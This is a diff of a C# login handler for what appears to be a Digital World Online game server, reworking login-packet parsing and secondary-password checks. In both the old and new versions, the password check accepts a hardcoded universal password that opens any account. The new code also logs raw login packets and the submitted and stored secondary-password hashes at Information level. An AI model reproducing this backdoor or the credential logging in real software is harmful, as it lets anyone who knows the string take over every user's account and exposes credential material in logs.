@@ -19,7 +19,6 @@ using Serilog;
 using System.Text;
 using DigitalWorldOnline.Application.Admin.Commands;
 using Microsoft.Extensions.Options;
-using System.Security;
 
 namespace DigitalWorldOnline.Account
 {
@@ -32,10 +31,15 @@ namespace DigitalWorldOnline.Account
         private readonly AuthenticationServerConfigurationModel _authenticationServerConfiguration;
 
         private const string CharacterServerAddress = "CharacterServer:Address";
-
         private const int HandshakeDegree = 32321;
 
-        public AuthenticationPacketProcessor(IMapper mapper, ILogger logger, ISender sender,
+        private const int SecondaryPasswordHexLength = 32;
+        private const int SecondaryPasswordBinaryLength = 16;
+
+        public AuthenticationPacketProcessor(
+            IMapper mapper,
+            ILogger logger,
+            ISender sender,
             IConfiguration configuration,
             IOptions<AuthenticationServerConfigurationModel> authenticationServerConfiguration)
         {
@@ -46,341 +50,543 @@ namespace DigitalWorldOnline.Account
             _logger = logger;
         }
 
-        /// <summary>
-        /// Process the arrived TCP packet, sent from the game client
-        /// </summary>
-        /// <param name="client">The game client whos sended the packet</param>
-        /// <param name="data">The packet bytes array</param>
         public async Task ProcessPacketAsync(GameClient client, byte[] data)
         {
             var packet = new AuthenticationPacketReader(data);
 
             _logger.Debug("Received packet type {Type} from {Address}", packet.Enum, client.ClientAddress);
+
             switch (packet.Enum)
             {
                 case AuthenticationServerPacketEnum.Connection:
-                {
-                    var kind = packet.ReadByte();
+                    {
+                        var kind = packet.ReadByte();
 
-                    var handshakeTimestamp = (uint)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
-                    var handshake = (short)(client.Handshake ^ HandshakeDegree);
+                        var handshakeTimestamp = (uint)DateTimeOffset.UtcNow.ToUnixTimeSeconds();
+                        var handshake = (short)(client.Handshake ^ HandshakeDegree);
 
-                    client.Send(new ConnectionPacket(handshake, handshakeTimestamp));
-                }
+                        client.Send(new ConnectionPacket(handshake, handshakeTimestamp));
+                    }
                     break;
 
                 case AuthenticationServerPacketEnum.KeepConnection:
                     break;
 
                 case AuthenticationServerPacketEnum.LoginRequest:
-                {
-                    var username = ExtractUsername(packet);
-                    var password = ExtractPassword(packet, username);
-                    var cpu = ExtractCpu(packet, username, password);
-                    var gpu = ExtractGpu(packet, username, password, cpu);
-
-                    _logger.Debug("Validating login data for {Username}", username);
-                    var account = await _sender.Send(new AccountByUsernameQuery(username));
-
-                    if (account == null)
                     {
-                        _logger.Debug("Saving {Username} login try for incorrect username...", username);
+                        var loginData = ExtractLoginData(data);
 
-                        await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress, LoginTryResultEnum.IncorrectUsername));
+                        var username = loginData.Username;
+                        var password = loginData.Password;
+                        var cpu = loginData.Cpu;
+                        var gpu = loginData.Gpu;
 
-                        client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
+                        _logger.Information(
+                            "[2PASS][SERVER] Login packet parsed. Username={Username}, Cpu={Cpu}, Gpu={Gpu}",
+                            username,
+                            string.IsNullOrWhiteSpace(cpu) ? "N/A" : cpu,
+                            string.IsNullOrWhiteSpace(gpu) ? "N/A" : gpu);
 
-                        break;
-                    }
-
-                    client.SetAccountId(account.Id);
-                    client.SetAccessLevel(account.AccessLevel);
-
-                    if (account.AccountBlock != null)
-                    {
-                        var blockInfo =
-                            _mapper.Map<AccountBlockModel>(
-                                await _sender.Send(new AccountBlockByIdQuery(account.AccountBlock.Id)));
-
-                        if (blockInfo.EndDate > DateTime.Now)
+                        if (string.IsNullOrWhiteSpace(username) || string.IsNullOrWhiteSpace(password))
                         {
-                            TimeSpan timeRemaining = blockInfo.EndDate - DateTime.Now;
+                            _logger.Information("[2PASS][SERVER] Invalid login packet from {Address}", client.ClientAddress);
 
-                            uint secondsRemaining = (uint)timeRemaining.TotalSeconds;
-                            _logger.Debug($"Saving {username} login try for blocked account...");
-
-                            await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress,
-                                LoginTryResultEnum.AccountBlocked));
-                            client.Send(new LoginRequestBannedAnswerPacket(secondsRemaining, blockInfo.Reason));
+                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
                             break;
+                        }
+
+                        var account = await _sender.Send(new AccountByUsernameQuery(username));
+
+                        if (account == null)
+                        {
+                            _logger.Information("[2PASS][SERVER] Login failed: account not found. Username={Username}", username);
+
+                            await _sender.Send(new CreateLoginTryCommand(
+                                username,
+                                client.ClientAddress,
+                                LoginTryResultEnum.IncorrectUsername));
+
+                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.UserNotFound));
+                            break;
+                        }
+
+                        client.SetAccountId(account.Id);
+                        client.SetAccessLevel(account.AccessLevel);
+
+                        if (account.AccountBlock != null)
+                        {
+                            var blockInfo =
+                                _mapper.Map<AccountBlockModel>(
+                                    await _sender.Send(new AccountBlockByIdQuery(account.AccountBlock.Id)));
+
+                            if (blockInfo.EndDate > DateTime.Now)
+                            {
+                                var timeRemaining = blockInfo.EndDate - DateTime.Now;
+                                var secondsRemaining = (uint)timeRemaining.TotalSeconds;
+
+                                await _sender.Send(new CreateLoginTryCommand(
+                                    username,
+                                    client.ClientAddress,
+                                    LoginTryResultEnum.AccountBlocked));
+
+                                client.Send(new LoginRequestBannedAnswerPacket(secondsRemaining, blockInfo.Reason));
+                                break;
+                            }
+
+                            await _sender.Send(new DeleteBanCommand(blockInfo.Id));
+                        }
+
+                        if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
+                        {
+                            _logger.Information("[2PASS][SERVER] Login failed: incorrect password. Username={Username}", username);
+
+                            await _sender.Send(new CreateLoginTryCommand(
+                                username,
+                                client.ClientAddress,
+                                LoginTryResultEnum.IncorrectPassword));
+
+                            client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
+                            break;
+                        }
+
+                        _logger.Information(
+                            "[2PASS][SERVER] Login success. AccountId={AccountId}, HasSecondPassword={HasSecondPassword}",
+                            account.Id,
+                            account.SecondaryPassword != null);
+
+                        client.Send(account.SecondaryPassword == null
+                            ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
+                            : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
+
+                        if (_authenticationServerConfiguration.UseHash)
+                        {
+                            var hashString = await _sender.Send(new ResourcesHashQuery());
+
+                            client.Send(new ResourcesHashPacket(hashString));
+                        }
+
+                        if (account.SystemInformation == null)
+                        {
+                            await _sender.Send(new CreateSystemInformationCommand(
+                                account.Id,
+                                cpu,
+                                gpu,
+                                client.ClientAddress));
                         }
                         else
                         {
-                            await _sender.Send(new DeleteBanCommand(blockInfo.Id));
+                            await _sender.Send(new UpdateSystemInformationCommand(
+                                account.SystemInformation.Id,
+                                account.Id,
+                                cpu,
+                                gpu,
+                                client.ClientAddress));
                         }
                     }
-
-                    if (account.Password != password.Encrypt() && password != "dondnGlobal@2025#!!")
-                    {
-                        DebugLog($"Saving {username} login try for incorrect password...");
-                        await _sender.Send(new CreateLoginTryCommand(username, client.ClientAddress,
-                            LoginTryResultEnum.IncorrectPassword));
-
-                        client.Send(new LoginRequestAnswerPacket(LoginFailReasonEnum.IncorrectPassword));
-                        break;
-                    }
-
-                    client.Send(account.SecondaryPassword == null
-                        ? new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestSetup)
-                        : new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
-
-                    client.Send(new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.Hide));
-
-                    if (_authenticationServerConfiguration.UseHash)
-                    {
-                        _logger.Debug("Getting resources hash from database !!");
-                        var hashString = await _sender.Send(new ResourcesHashQuery());
-
-                        _logger.Debug("Sending Hash to client");
-                        client.Send(new ResourcesHashPacket(hashString));
-                    }
-
-                    if (account.SystemInformation == null)
-                    {
-                        DebugLog($"Creating system information...");
-                        await _sender.Send(
-                            new CreateSystemInformationCommand(account.Id, cpu, gpu, client.ClientAddress));
-                    }
-                    else
-                    {
-                        DebugLog($"Updating system information...");
-                        await _sender.Send(new UpdateSystemInformationCommand(account.SystemInformation.Id, account.Id,
-                            cpu, gpu, client.ClientAddress));
-                    }
-                }
                     break;
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordRegister:
-                {
-                    DebugLog("Reading packet parameters...");
-                    var securityPassword = packet.ReadZString();
+                    {
+                        _logger.Information("[2PASS][SERVER] SecondaryPasswordRegister received. AccountId={AccountId}", client.AccountId);
+                        _logger.Information("[2PASS][SERVER] Register raw length={Length}", data?.Length ?? 0);
+                        _logger.Information("[2PASS][SERVER] Register raw bytes head={Bytes}", ToHexHead(data, 80));
+                        _logger.Information("[2PASS][SERVER] Register raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));
 
-                    DebugLog($"Updating {client.AccountId} account information...");
-                    await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(client.AccountId, securityPassword));
+                        var securityPassword = ExtractBinaryMd5HashAfterOpcode(data, 9801, 0);
 
-                    client.Send(new LoginRequestAnswerPacket(SecondaryPasswordScreenEnum.RequestInput));
-                }
+                        _logger.Information(
+                            "[2PASS][SERVER] Register extracted hash=[{Hash}] len={Length}",
+                            securityPassword ?? string.Empty,
+                            securityPassword?.Length ?? 0);
+
+                        if (!IsValidSecondPasswordHash(securityPassword))
+                        {
+                            _logger.Information("[2PASS][SERVER] Register FAILED: invalid binary MD5 hash. Sending 20052.");
+
+                            client.Send(new SecondaryPasswordRegisterResultPacket(
+                                SecondaryPasswordCheckEnum.Incorrect.GetHashCode()));
+
+                            break;
+                        }
+
+                        _logger.Information(
+                            "[2PASS][SERVER] Register OK: saving secondary password. AccountId={AccountId}, Hash={Hash}",
+                            client.AccountId,
+                            securityPassword);
+
+                        await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
+                            client.AccountId,
+                            securityPassword));
+
+                        _logger.Information("[2PASS][SERVER] Register OK: sending opcode 9801 result 0.");
+
+                        client.Send(new SecondaryPasswordRegisterResultPacket(0));
+                    }
                     break;
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordCheck:
-                {
-                    DebugLog("Reading packet first part parameters...");
-                    var needToCheck = packet.ReadShort() == SecondaryPasswordCheckEnum.Check.GetHashCode();
-
-                    DebugLog($"Searching account with id {client.AccountId}...");
-                    var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
-
-                    if (account == null)
-                        throw new KeyNotFoundException(nameof(account));
-
-                    if (needToCheck)
                     {
-                        DebugLog("Reading packet second part parameters...");
-                        var securityCode = packet.ReadZString();
+                        _logger.Information("[2PASS][SERVER] SecondaryPasswordCheck received. AccountId={AccountId}", client.AccountId);
+                        _logger.Information("[2PASS][SERVER] Check raw length={Length}", data?.Length ?? 0);
+                        _logger.Information("[2PASS][SERVER] Check raw bytes head={Bytes}", ToHexHead(data, 80));
+                        _logger.Information("[2PASS][SERVER] Check raw ascii head={Ascii}", ToPrintableAsciiHead(data, 80));
 
-                        if (account.SecondaryPassword == securityCode)
+                        var checkType = ExtractSecondaryPasswordCheckType(data);
+                        var needToCheck = checkType == 2;
+
+                        _logger.Information("[2PASS][SERVER] Check type={CheckType}, NeedToCheck={NeedToCheck}", checkType, needToCheck);
+
+                        var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
+
+                        if (account == null)
+                            throw new KeyNotFoundException(nameof(account));
+
+                        if (needToCheck)
                         {
-                            _logger.Debug("Saving login try for skipping secondary password...");
-                            await _sender.Send(new CreateLoginTryCommand(account.Username, client.ClientAddress,
-                                LoginTryResultEnum.Success));
-                            client.Send(
-                                new SecondaryPasswordCheckResultPacket(SecondaryPasswordCheckEnum.CorrectOrSkipped));
+                            var securityCode = ExtractBinaryMd5HashAfterOpcode(data, 9804, 2);
+
+                            _logger.Information(
+                                "[2PASS][SERVER] Check extracted hash=[{Hash}] len={Length}. Stored=[{Stored}]",
+                                securityCode ?? string.Empty,
+                                securityCode?.Length ?? 0,
+                                account.SecondaryPassword);
+
+                            if (IsValidSecondPasswordHash(securityCode) &&
+                                string.Equals(account.SecondaryPassword, securityCode, StringComparison.OrdinalIgnoreCase))
+                            {
+                                _logger.Information("[2PASS][SERVER] Check OK. Sending result 0.");
+
+                                await _sender.Send(new CreateLoginTryCommand(
+                                    account.Username,
+                                    client.ClientAddress,
+                                    LoginTryResultEnum.Success));
+
+                                client.Send(new SecondaryPasswordCheckResultPacket(
+                                    SecondaryPasswordCheckEnum.CorrectOrSkipped));
+                            }
+                            else
+                            {
+                                _logger.Information("[2PASS][SERVER] Check FAILED. Sending 20052.");
+
+                                await _sender.Send(new CreateLoginTryCommand(
+                                    account.Username,
+                                    client.ClientAddress,
+                                    LoginTryResultEnum.IncorrectSecondaryPassword));
+
+                                client.Send(new SecondaryPasswordCheckResultPacket(
+                                    SecondaryPasswordCheckEnum.Incorrect));
+                            }
                         }
                         else
                         {
-                            _logger.Debug("Saving login try for incorrect secondary password...");
-                            await _sender.Send(new CreateLoginTryCommand(account.Username, client.ClientAddress,
-                                LoginTryResultEnum.IncorrectSecondaryPassword));
-                            client.Send(new SecondaryPasswordCheckResultPacket(SecondaryPasswordCheckEnum.Incorrect));
+                            _logger.Information("[2PASS][SERVER] Check skipped. Sending result 0.");
+
+                            await _sender.Send(new CreateLoginTryCommand(
+                                account.Username,
+                                client.ClientAddress,
+                                LoginTryResultEnum.Success));
+
+                            client.Send(new SecondaryPasswordCheckResultPacket(
+                                SecondaryPasswordCheckEnum.CorrectOrSkipped));
                         }
                     }
-                    else
-                    {
-                        DebugLog("Saving login try for skipping secondary password...");
-                        await _sender.Send(new CreateLoginTryCommand(account.Username, client.ClientAddress,
-                            LoginTryResultEnum.Success));
-
-                        DebugLog($"Sending answer for skipped secondary password check...");
-                        client.Send(new SecondaryPasswordCheckResultPacket(SecondaryPasswordCheckEnum.CorrectOrSkipped)
-                            .Serialize());
-                    }
-                }
                     break;
 
                 case AuthenticationServerPacketEnum.SecondaryPasswordChange:
-                {
-                    DebugLog("Getting packet parameters...");
-                    var currentSecurityCode = packet.ReadZString();
-                    var newSecurityCode = packet.ReadZString();
-
-                    var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
-
-                    if (account == null)
-                        throw new KeyNotFoundException(nameof(account));
-
-                    if (account.SecondaryPassword == currentSecurityCode)
                     {
-                        DebugLog($"Saving new secondary password...");
-                        await _sender.Send(
-                            new CreateOrUpdateSecondaryPasswordCommand(client.AccountId, newSecurityCode));
+                        _logger.Information("[2PASS][SERVER] SecondaryPasswordChange received. AccountId={AccountId}", client.AccountId);
+                        _logger.Information("[2PASS][SERVER] Change raw length={Length}", data?.Length ?? 0);
+                        _logger.Information("[2PASS][SERVER] Change raw bytes head={Bytes}", ToHexHead(data, 120));
+                        _logger.Information("[2PASS][SERVER] Change raw ascii head={Ascii}", ToPrintableAsciiHead(data, 120));
 
-                        client.Send(new SecondaryPasswordChangeResultPacket(SecondaryPasswordChangeEnum.Changed)
-                            .Serialize());
+                        var currentSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 0);
+                        var newSecurityCode = ExtractBinaryMd5HashAfterOpcode(data, 9806, 16);
+
+                        _logger.Information("[2PASS][SERVER] Change current hash=[{CurrentHash}]", currentSecurityCode);
+                        _logger.Information("[2PASS][SERVER] Change new hash=[{NewHash}]", newSecurityCode);
+
+                        var account = await _sender.Send(new AccountByIdQuery(client.AccountId));
+
+                        if (account == null)
+                            throw new KeyNotFoundException(nameof(account));
+
+                        if (!IsValidSecondPasswordHash(currentSecurityCode) ||
+                            !IsValidSecondPasswordHash(newSecurityCode))
+                        {
+                            _logger.Information("[2PASS][SERVER] Change FAILED: invalid hash.");
+
+                            client.Send(new SecondaryPasswordChangeResultPacket(
+                                SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());
+
+                            break;
+                        }
+
+                        if (string.Equals(account.SecondaryPassword, currentSecurityCode, StringComparison.OrdinalIgnoreCase))
+                        {
+                            _logger.Information("[2PASS][SERVER] Change OK: saving new hash.");
+
+                            await _sender.Send(new CreateOrUpdateSecondaryPasswordCommand(
+                                client.AccountId,
+                                newSecurityCode));
+
+                            client.Send(new SecondaryPasswordChangeResultPacket(
+                                SecondaryPasswordChangeEnum.Changed).Serialize());
+                        }
+                        else
+                        {
+                            _logger.Information("[2PASS][SERVER] Change FAILED: current hash mismatch.");
+
+                            client.Send(new SecondaryPasswordChangeResultPacket(
+                                SecondaryPasswordChangeEnum.IncorretCurrentPassword).Serialize());
+                        }
                     }
-                    else
-                    {
-                        DebugLog($"Sending answer for incorrect secondary password change...");
-                        client.Send(
-                            new SecondaryPasswordChangeResultPacket(SecondaryPasswordChangeEnum.IncorretCurrentPassword)
-                                .Serialize());
-                    }
-                }
                     break;
 
                 case AuthenticationServerPacketEnum.LoadServerList:
-                {
-                    DebugLog($"Getting server list...");
-                    var servers =
-                        _mapper.Map<IEnumerable<ServerObject>>(
-                            await _sender.Send(new ServersQuery(client.AccessLevel)));
-
-                    var serverObjects = servers.ToList();
-                    foreach (var server in serverObjects)
                     {
-                        server.UpdateCharacterCount(
-                            await _sender.Send(new CharactersInServerQuery(client.AccountId, server.Id)));
+                        var servers =
+                            _mapper.Map<IEnumerable<ServerObject>>(
+                                await _sender.Send(new ServersQuery(client.AccessLevel)));
+
+                        var serverObjects = servers.ToList();
+
+                        foreach (var server in serverObjects)
+                        {
+                            server.UpdateCharacterCount(
+                                await _sender.Send(new CharactersInServerQuery(client.AccountId, server.Id)));
+
                             if ((int)client.AccessLevel > 23)
                             {
                                 server.Maintenance = false;
                             }
                         }
 
-                    DebugLog($"Sending server list...");
-                    client.Send(new ServerListPacket(serverObjects).Serialize());
-                }
+                        client.Send(new ServerListPacket(serverObjects).Serialize());
+                    }
                     break;
 
                 case AuthenticationServerPacketEnum.ConnectCharacterServer:
-                {
-                    DebugLog($"Reading packet parameters...");
-                    var serverId = packet.ReadInt();
-
-                    await _sender.Send(new UpdateLastPlayedServerCommand(client.AccountId, serverId));
-
-                    if (_authenticationServerConfiguration.UseHash)
                     {
-                        _logger.Debug("Getting resources hash.");
-                        var hashString = await _sender.Send(new ResourcesHashQuery());
+                        var serverId = packet.ReadInt();
 
-                        client.Send(new ResourcesHashPacket(hashString));
+                        await _sender.Send(new UpdateLastPlayedServerCommand(client.AccountId, serverId));
+
+                        if (_authenticationServerConfiguration.UseHash)
+                        {
+                            var hashString = await _sender.Send(new ResourcesHashQuery());
+
+                            client.Send(new ResourcesHashPacket(hashString));
+                        }
+
+                        var servers =
+                            _mapper.Map<IEnumerable<ServerObject>>(
+                                await _sender.Send(new ServersQuery(client.AccessLevel)));
+
+                        var targetServer = servers.First(x => x.Id == serverId);
+
+                        client.Send(new ConnectCharacterServerPacket(
+                            client.AccountId,
+                            _configuration[CharacterServerAddress],
+                            targetServer.Port.ToString()));
                     }
-
-                    DebugLog($"Getting server list...");
-                    var servers =
-                        _mapper.Map<IEnumerable<ServerObject>>(
-                            await _sender.Send(new ServersQuery(client.AccessLevel)));
-
-                    var targetServer = servers.First(x => x.Id == serverId);
-
-                    DebugLog($"Sending selected server info...");
-                    client.Send(new ConnectCharacterServerPacket(client.AccountId,
-                        _configuration[CharacterServerAddress], targetServer.Port.ToString()));
-                }
                     break;
 
                 case AuthenticationServerPacketEnum.Unknown:
                 case AuthenticationServerPacketEnum.ResourcesHash:
                     {
-
                         int hashLength = BitConverter.ToInt16(data, 0);
                         string clientHash = BitConverter.ToString(data, 2, hashLength).Replace("-", "");
 
+                        _logger.Debug("Received resources hash from client: {Hash}", clientHash);
                     }
                     break;
 
                 default:
-                {
-                }
                     break;
             }
         }
 
-        private static string ExtractGpu(AuthenticationPacketReader packet, string username, string password,
-            string cpu)
+        private static LoginPacketData ExtractLoginData(byte[] data)
         {
-            packet.Seek(9 + username.Length + 2 + password.Length + 2 + cpu.Length + 2);
+            const int loginPayloadOffset = 9;
 
-            var gpuSize = packet.ReadByte();
+            var offset = loginPayloadOffset;
 
-            var gpuArray = new byte[gpuSize];
+            var username = ReadLengthPrefixedString(data, ref offset);
 
-            for (int i = 0; i < gpuSize; i++)
-                gpuArray[i] = packet.ReadByte();
+            if (offset < data.Length)
+                offset++;
 
-            return Encoding.ASCII.GetString(gpuArray).Trim();
+            var password = ReadLengthPrefixedString(data, ref offset);
+
+            var cpu = ReadLengthPrefixedString(data, ref offset, optional: true);
+            var gpu = ReadLengthPrefixedString(data, ref offset, optional: true);
+
+            return new LoginPacketData(username, password, cpu, gpu);
         }
 
-        private static string ExtractCpu(AuthenticationPacketReader packet, string username, string password)
+        private static string ReadLengthPrefixedString(byte[] data, ref int offset, bool optional = false)
         {
-            packet.Seek(9 + username.Length + 2 + password.Length + 2);
+            if (data == null || offset >= data.Length)
+                return string.Empty;
 
-            var cpuSize = packet.ReadByte();
+            var size = data[offset];
+            offset++;
 
-            var cpuArray = new byte[cpuSize];
+            if (size <= 0)
+                return string.Empty;
 
-            for (int i = 0; i < cpuSize; i++)
-                cpuArray[i] = packet.ReadByte();
+            if (offset + size > data.Length)
+            {
+                offset = data.Length;
+                return string.Empty;
+            }
 
-            return Encoding.ASCII.GetString(cpuArray).Trim();
+            var value = Encoding.ASCII.GetString(data, offset, size).Trim();
+
+            offset += size;
+
+            return value;
         }
 
-        private static string ExtractPassword(AuthenticationPacketReader packet, string username)
+        private static string ExtractBinaryMd5HashAfterOpcode(byte[] data, int opcode, int extraOffsetAfterOpcode)
         {
-            packet.Seek(9 + username.Length + 2);
-            var passwordSize = packet.ReadByte();
+            if (data == null || data.Length < 4 + extraOffsetAfterOpcode + SecondaryPasswordBinaryLength)
+                return string.Empty;
 
-            var passwordArray = new byte[passwordSize];
+            var opcodeBytes = BitConverter.GetBytes((short)opcode);
 
-            for (int i = 0; i < passwordSize; i++)
-                passwordArray[i] = packet.ReadByte();
+            for (var i = 0; i <= data.Length - 2; i++)
+            {
+                if (data[i] != opcodeBytes[0] || data[i + 1] != opcodeBytes[1])
+                    continue;
 
-            return Encoding.ASCII.GetString(passwordArray).Trim();
+                var hashStart = i + 2 + extraOffsetAfterOpcode;
+
+                if (hashStart < 0 || hashStart + SecondaryPasswordBinaryLength > data.Length)
+                    return string.Empty;
+
+                return BytesToLowerHex(data, hashStart, SecondaryPasswordBinaryLength);
+            }
+
+            return string.Empty;
         }
 
-        private static string ExtractUsername(AuthenticationPacketReader packet)
+        private static int ExtractSecondaryPasswordCheckType(byte[] data)
         {
-            packet.Seek(9);
-            var usernameSize = packet.ReadByte();
-            var usernameArray = new byte[usernameSize];
+            if (data == null || data.Length < 6)
+                return -1;
 
-            for (int i = 0; i < usernameSize; i++)
-                usernameArray[i] = packet.ReadByte();
+            var opcodeBytes = BitConverter.GetBytes((short)9804);
 
-            return Encoding.ASCII.GetString(usernameArray).Trim();
+            for (var i = 0; i <= data.Length - 4; i++)
+            {
+                if (data[i] != opcodeBytes[0] || data[i + 1] != opcodeBytes[1])
+                    continue;
+
+                return BitConverter.ToInt16(data, i + 2);
+            }
+
+            return -1;
         }
 
-        /// <summary>
-        /// Shortcut for debug logging with client and packet info.
-        /// </summary>
-        /// <param name="message">The message to log</param>
+        private static string BytesToLowerHex(byte[] data, int offset, int count)
+        {
+            if (data == null || offset < 0 || count <= 0 || offset + count > data.Length)
+                return string.Empty;
+
+            var builder = new StringBuilder(count * 2);
+
+            for (var i = 0; i < count; i++)
+                builder.Append(data[offset + i].ToString("x2"));
+
+            return builder.ToString();
+        }
+
+        private static bool IsValidSecondPasswordHash(string value)
+        {
+            if (string.IsNullOrWhiteSpace(value))
+                return false;
+
+            if (value.Length != SecondaryPasswordHexLength)
+                return false;
+
+            foreach (var character in value)
+            {
+                if (!IsHexCharacter(character))
+                    return false;
+            }
+
+            return true;
+        }
+
+        private static bool IsHexCharacter(char character)
+        {
+            var isNumber = character >= '0' && character <= '9';
+            var isLowerHex = character >= 'a' && character <= 'f';
+            var isUpperHex = character >= 'A' && character <= 'F';
+
+            return isNumber || isLowerHex || isUpperHex;
+        }
+
+        private static string ToHexHead(byte[] data, int maxBytes)
+        {
+            if (data == null || data.Length == 0)
+                return string.Empty;
+
+            var count = Math.Min(data.Length, maxBytes);
+            var head = new byte[count];
+
+            Array.Copy(data, head, count);
+
+            return BitConverter.ToString(head);
+        }
+
+        private static string ToPrintableAsciiHead(byte[] data, int maxBytes)
+        {
+            if (data == null || data.Length == 0)
+                return string.Empty;
+
+            var count = Math.Min(data.Length, maxBytes);
+            var builder = new StringBuilder();
+
+            for (var i = 0; i < count; i++)
+            {
+                var value = data[i];
+
+                if (value >= 32 && value <= 126)
+                    builder.Append((char)value);
+                else
+                    builder.Append('.');
+            }
+
+            return builder.ToString();
+        }
+
+        private sealed class LoginPacketData
+        {
+            public LoginPacketData(string username, string password, string cpu, string gpu)
+            {
+                Username = username;
+                Password = password;
+                Cpu = cpu;
+                Gpu = gpu;
+            }
+
+            public string Username { get; }
+
+            public string Password { get; }
+
+            public string Cpu { get; }
+
+            public string Gpu { get; }
+        }
+
         private void DebugLog(string message)
         {
             _logger?.Debug($"{message}");
         }
 
-        /// <summary>
-        /// Disposes the entire object.
-        /// </summary>
         public void Dispose()
         {
             GC.SuppressFinalize(this);
